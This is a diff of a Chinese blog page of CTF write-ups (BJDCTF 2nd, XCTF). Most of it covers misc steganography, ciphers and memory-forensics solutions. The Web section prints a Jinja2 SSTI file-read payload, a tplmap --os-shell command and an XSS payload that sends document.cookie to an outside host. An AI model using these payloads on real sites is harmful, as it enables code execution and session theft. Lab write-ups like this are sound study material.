@@ -7,11 +7,11 @@
 <p>&nbsp;</p>
 <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="最简单的misc-y1ng"><a href="#最简单的misc-y1ng" class="headerlink" title="最简单的misc-y1ng"></a>最简单的misc-y1ng</h3><p>思路：伪加密+补全文件头+16进制转ASCII</p>
 <p>09-&gt;00，补全文件头89 50 4E 47，得到下图</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>将下面那一行转换为ASCII后得到flag：<code>BJD{y1ngzuishuai}</code></p>
 <h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>思路：png高度修改</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/21/BJDCTF-2nd-wp/2.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/21/BJDCTF-2nd-wp/2.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>开始没想修改高度，直接放到slover了啥也没发现，然后用zsteg没法发现隐写，最后去改了高度</p>
 <p>得到flag：<code>BJD{PnG_He1ghT_1s_WR0ng}</code></p>
@@ -19,36 +19,36 @@
 <p>foremost分离出了一个zip，解压得到一个jpg，格式不正确，file一下发现是avi，改后缀</p>
 <p>近期钉钉“求饶”视频，但是里面混进去一些图片，pr，ae，ff不会用。。（所以我选择迅雷</p>
 <p>逐帧查看后发现四张图片(都是出题人…</p>
-<p><a href="/2020/03/21/BJDCTF-2nd-wp/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/3.png" src="/img/loading.gif" class="lazyload"></a><a href="/2020/03/21/BJDCTF-2nd-wp/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/4.png" src="/img/loading.gif" class="lazyload"></a></p>
-<p><a href="/2020/03/21/BJDCTF-2nd-wp/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/5.png" src="/img/loading.gif" class="lazyload"></a><a href="/2020/03/21/BJDCTF-2nd-wp/6.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/6.png" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/3.png" src="/img/loading.gif" class="lazyload"></a><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/4.png" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/5.png" src="/img/loading.gif" class="lazyload"></a><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/6.png" src="/img/loading.gif" class="lazyload"></a></p>
 <p>前三张反色完，要不PsQREdit，要不Barcode Reader都能扫出来</p>
 <p>但是第4张中间有、糊，于是掏出QRazyBox自己拼了一张</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/7.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/7.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/7.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>最后把扫出来的字符串拼起来得到<code>6167696E5F6C  6F76655F59  424A447B696D  316E677D</code></p>
 <p>16进制转ASCII后调整一下顺序得到flag：<code>BJD{imagin_love_Y1ng}</code></p>
 <h3 id="小姐姐-y1ng"><a href="#小姐姐-y1ng" class="headerlink" title="小姐姐-y1ng"></a>小姐姐-y1ng</h3><p>思路：直接010里搜BJD</p>
 <p>u1s1，图不错，这题卡了半天</p>
 <p>刚开始拿stegdetect分析了一下，以为是jphide。。然后因为不知道密码是啥就一直卡住了，break爆破也爆不出来</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/8.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/8.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/8.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>最后去010里面搜了一下BJD。。（人傻了</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/9.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/9.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/9.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>得到flag：<code>BJD{haokanma_xjj}</code></p>
 <h3 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h3><p>思路：010里面看flag形状（抽象带师。。</p>
 <p>打开010，往下拉</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/10.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/21/BJDCTF-2nd-wp/10.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/21/BJDCTF-2nd-wp/10.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>得到flag：<code>BJD{572154976}</code></p>
 <h3 id="圣火昭昭-y1ng"><a href="#圣火昭昭-y1ng" class="headerlink" title="圣火昭昭-y1ng"></a>圣火昭昭-y1ng</h3><p>思路：新佛曰+outguess隐写</p>
 <p>看属性发现新佛曰，<a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">解码</a>一下（得到key：gemlove，题目提示去掉com</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/11.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/11.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/11.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>然后根据题目hint：<code>开局一张图，flag全靠猜</code>     暗示outguess隐写</p>
 <p>其实刚开始我没理解这意思，然后用stegdetect扫<code>error: Quantization table 0x00 was not defined</code></p>
 <p>打开010看一下，发现大量00，20明示outguess隐写</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/12.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/12.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/12.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>解出来得到flag：<code>BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</code></p>
 <h3 id="TARGZ-y1ng"><a href="#TARGZ-y1ng" class="headerlink" title="TARGZ-y1ng"></a>TARGZ-y1ng</h3><p>思路：文件名为压缩包密码，多层压缩包解密</p>
@@ -72,15 +72,15 @@
 <p>base64解码得到flag：<code>BJD{W3lc0me_T0_BJDCTF}</code></p>
 <h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><p>这题给爷整笑了，百度翻译读一下</p>
 <p>去掉BJD{}对应的字，得到flag：<code>BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}</code></p>
-<h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><a href="/2020/03/21/BJDCTF-2nd-wp/13.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/13.gif" src="/img/loading.gif" class="lazyload"></a>
+<h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/13.gif" src="/img/loading.gif" class="lazyload"></a>
 
 <p>拿🍙的是0，拿🍗的是1，翻译一下，二进制转ASCII</p>
 <p>得到flag：<code>BJD{M!a0~}</code></p>
-<h3 id="灵能精通-y1ng"><a href="#灵能精通-y1ng" class="headerlink" title="灵能精通-y1ng"></a>灵能精通-y1ng</h3><a href="/2020/03/21/BJDCTF-2nd-wp/14.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/21/BJDCTF-2nd-wp/14.png" src="/img/loading.gif" class="lazyload"></a>
+<h3 id="灵能精通-y1ng"><a href="#灵能精通-y1ng" class="headerlink" title="灵能精通-y1ng"></a>灵能精通-y1ng</h3><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/21/BJDCTF-2nd-wp/14.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>圣堂武士密码，翻译一哈，flag：<code>BJD{IMKNIGHTSTEMPLAR}</code></p>
 <h3 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h3><p>16进制转ASCII+维吉尼亚密码</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/16.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/16.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/16.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>得到flag：<code>bjd{yanzi_jiushige_shabi}</code></p>
 <h3 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="Y1nglish-y1ng"></a>Y1nglish-y1ng</h3><p>本来以为这题是词频分析，然后直接上脚本，还把字母顺序和最常出现字母顺序对应了一下，然并卵</p>
@@ -89,7 +89,7 @@
 <p>最后得到flag：<code>BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</code></p>
 <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p>SSTI模板注入 （jinjia2</p>
 <p>随意输一个数字在网页源代码出看到提示ssssssti，然而并不会…..</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/17.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/17.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/17.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>根据<a href="https://www.1p0ch.cn" target="_blank" rel="noopener">王牌辅助楠子神</a>给的提示，搜SSTI模板注入，大概看懂了点，讲也讲不出来，直接放payload</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">markdown</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">qaq?name=&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">177</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">'open'</span>](<span class="link">'/flag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>
@@ -101,18 +101,18 @@
 </blockquote>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./tplmap.py -u http://9df44046-64a1-4ab3-b167-6e2bca4fe272.node3.buuoj.cn/qaq?name= --os-shell</span><br></pre></td></tr></table></figure></div>
 
-<a href="/2020/03/21/BJDCTF-2nd-wp/22.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/22.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/22.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h3><p>网站提示：Power By thinkphp5</p>
 <p>随便输入一个s参数，报错如下</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/20.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/20.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/20.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>得到tp版本，网上搜一下<a href="https://blog.csdn.net/qq_38807738/article/details/86777541" target="_blank" rel="noopener">5.0.23</a>的漏洞，可以直接用的，得到flag</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/21.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/21.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/21.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><p>开始是个vim文件泄露，而且没走寻常路，dirsearch也没扫出来</p>
 <p>备份文件在/.index.php.swp里，vim -r  恢复一下</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/18.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/18.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/18.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>起初以为是个RCE，绕倒是不难，但是它没回显。。</p>
 <p>于是就开始了我漫长的，弹shell之路。试过bash，python，curl，perl，nc…..</p>
@@ -132,16 +132,16 @@
 <p>列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加 Via 头部，并填上自己的相关信息，当下一个代理服务器 收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的Via 头部，并把自己的相关信息加到后面， 以此类推，当 OCS 收到最后一个代理服务器的请求时，检查 Via 头部，就知道该请求所经过的路由。</p>
 </blockquote>
 <p>再开环境做了一遍得到flag</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/19.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/19.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/19.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h3><p>Git源码泄露，反序列化，xss</p>
 <p>开局  gungungun  老祖安人了，查看源码啥也没有，扫一下目录，发现Git泄露</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/23.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/23.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/23.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>提示有xss漏洞，利用php原生类构造payload</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = serialize(<span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;window.location.href='http://b9c4633b-9ce6-4937-8b9f-a1b02de9a086.node3.buuoj.cn/'+document.cookie&lt;/script&gt;"</span>));</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></div>
 
-<a href="/2020/03/21/BJDCTF-2nd-wp/24.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/24.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/24.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>在cookie中得到url编码的flag，解码后得到flag</p>
 <p>&nbsp;</p>
@@ -166,7 +166,7 @@
 <p>早上起来的时候发现签到题和一道misc已经被做了，伤心！（web是不敢想的，也就水水misc。。</p>
 <h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="简单misc"><a href="#简单misc" class="headerlink" title="简单misc"></a>简单misc</h4><p>思路：文件头修复+文件分离+摩斯密码+base64</p>
 <p>用winhex或者010editor或者hxd打开文件，修复文件头为FFD8</p>
-<a href="/2020/03/09/xctf-misc-wp/1.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/09/xctf-misc-wp/1.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/09/xctf-misc-wp/1.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>好像并没有什么有用的信息，搜一下文件尾FFD9，发现后面有个压缩包</p>
 <p>手动提取也行，binwalk也行，foremost也行（最近爱上了手撕，因为不用往linux里放了</p>
@@ -177,21 +177,21 @@
 <p>&nbsp;</p>
 <h4 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h4><p>反色二维码补全扫码+伪加密+频谱图(高群、低群)电话音分析+base64加密</p>
 <p>把二维码里面反色一下，补上三个定位点</p>
-<a href="/2020/03/09/xctf-misc-wp/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/09/xctf-misc-wp/2.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/09/xctf-misc-wp/2.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>扫出来是：<code>flag{this_is_also_not_flag} 解压密码不在这里0.0！</code></p>
 <p>并没有什么卵用，然后还在二维码那张图片里发现了这个</p>
-<a href="/2020/03/09/xctf-misc-wp/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/09/xctf-misc-wp/3.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/09/xctf-misc-wp/3.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>应该是找出隐藏的信息后base64加密（后面是TOGETYOUFLAG</p>
 <p>然后就是那个纯数字的压缩包，我从1位爆破到10位后，感觉不对劲</p>
-<a href="/2020/03/09/xctf-misc-wp/4.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="10%" height="10%" data-src="/2020/03/09/xctf-misc-wp/4.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="10%" height="10%" data-src="/2020/03/09/xctf-misc-wp/4.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>再高位数跑完怕不是比赛都结束了，放进010一看，淦，伪加密</p>
 <p>解开后得到一个音频，放进Audacity看一下，发现正巧是前几天看的<a href="https://www.ichunqiu.com/course/61665" target="_blank" rel="noopener">视频</a>里的（拨号音</p>
-<p><a href="/2020/03/09/xctf-misc-wp/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/5.png" src="/img/loading.gif" class="lazyload"></a><a href="/2020/03/09/xctf-misc-wp/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/5.png" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/5.png" src="/img/loading.gif" class="lazyload"></a><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/5.png" src="/img/loading.gif" class="lazyload"></a></p>
 <p>手解一下</p>
-<a href="/2020/03/09/xctf-misc-wp/7.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/09/xctf-misc-wp/7.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/09/xctf-misc-wp/7.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>得到一串数字：<code>187485618521</code>，base64加密一下得到flag</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MTg3NDg1NjE4NTIx</span><br></pre></td></tr></table></figure></div>
@@ -206,32 +206,32 @@
 <p>发现是32位的winxp，列一下进程(pslist无法显示隐藏/终止进程，可以用插件psscan解决</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem --profile=WinXPSP2x86 pslist</span><br></pre></td></tr></table></figure></div>
 
-<a href="/2020/03/09/xctf-misc-wp/8.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/8.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/8.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>当时关键进程抓错了。。没分析IE（一生之敌）。。直接去提取cmd和conime的进程，然后去扫flag字符串</p>
 <p>陷进去的时候，那道题已经被解出来了，然后就不想做了。。（小白还是小白。。</p>
 <p>关键进程应该是explorer.exe和cmd.exe</p>
 <p>先去提取内存中保留的 cmd 命令使用情况</p>
-<a href="/2020/03/09/xctf-misc-wp/10.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/10.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/10.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>发现passwd：<code>weak_auth_top100</code></p>
 <p>然后用iehistory查看ie浏览器使用情况发现没有信息，于是用editbox查看输入框信息</p>
-<a href="/2020/03/09/xctf-misc-wp/9.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/9.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/9.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>发现ie访问的地址是 “C:\Documents and Settings\Administrator”</p>
 <p>于是用filescan搜索文件，grep过滤包含<code>Administrator</code>的地址</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem --profile=WinXPSP2x86 filescan | grep <span class="string">"Administrator"</span></span><br></pre></td></tr></table></figure></div>
 
-<a href="/2020/03/09/xctf-misc-wp/11.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/11.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/11.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>发现flag.img，提取出来</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem --profile=WinXPSP2x86 dumpfiles -Q 0x0000000001155f90 -n --dump-dir=./</span><br></pre></td></tr></table></figure></div>
 
-<a href="/2020/03/09/xctf-misc-wp/12.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/09/xctf-misc-wp/12.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/09/xctf-misc-wp/12.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>其实当时我也过滤了好多。。但是过滤的都是zip、rar、png、jpg、txt、pacp啥的。。没想过img文件（其实过滤flag也行</p>
 <p>得到文件file.None.0xff425090.dat，修改后缀为img，把里面的东西提取一下</p>
-<a href="/2020/03/09/xctf-misc-wp/13.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/09/xctf-misc-wp/13.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/09/xctf-misc-wp/13.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>得到一个加密的压缩包，密码就是<code>weak_auth_top100</code>（我还以为是弱口令爆破，试了两组后就放弃了</p>
 <p>解压得到usbdata.txt ，网上有脚本可以分析，贴个<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html" target="_blank" rel="noopener">网址</a>，大佬分析的挺全面的</p>
@@ -242,17 +242,17 @@
 <p>提取到flag.exe就不会了，IDA分析不会。。运行的时候倒是发现六个输入接回车后会输出一些无规则字符。。</p>
 <p>赛后讨论的时候才知道加了个VMP壳？。。</p>
 <p>然后群里的师傅发现了这个</p>
-<a href="/2020/03/09/xctf-misc-wp/15.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/15.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/15.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>还有这个</p>
